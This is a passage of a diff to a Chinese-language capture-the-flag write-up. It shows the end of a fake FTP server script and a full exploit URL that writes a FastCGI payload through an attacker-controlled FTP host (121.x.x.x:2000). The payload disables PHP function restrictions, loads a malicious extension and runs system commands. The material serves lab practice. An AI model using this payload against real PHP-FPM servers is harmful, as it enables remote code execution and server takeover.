@@ -311,6 +311,7 @@ conn.send(b&#39;150 Permission denied.\n&#39;)
 conn.send(b&#39;221 Goodbye.\n&#39;)
 conn.close()
 </code></pre><p>同时监听3333端口。<br>生成攻击 php-fpm 所需要的payload：</p>
+<p>见<a href="http://www.hackdig.com/05/hack-342091.htm" target="_blank" rel="noopener">http://www.hackdig.com/05/hack-342091.htm</a><br>太长了就不放了</p>
 <p>payload：</p>
 <pre><code>567bb380-8360-4aeb-b93c-cddea7970584.node3.buuoj.cn/add_api.php?backdoor=$file = $_GET[&#39;file&#39;];$data = $_GET[&#39;data&#39;];file_put_contents($file,$data);&amp;file=ftp://121.x.x.x:2000&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9000%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00
 </code></pre><p>但此时权限还是不够，无法读取flag：</p>
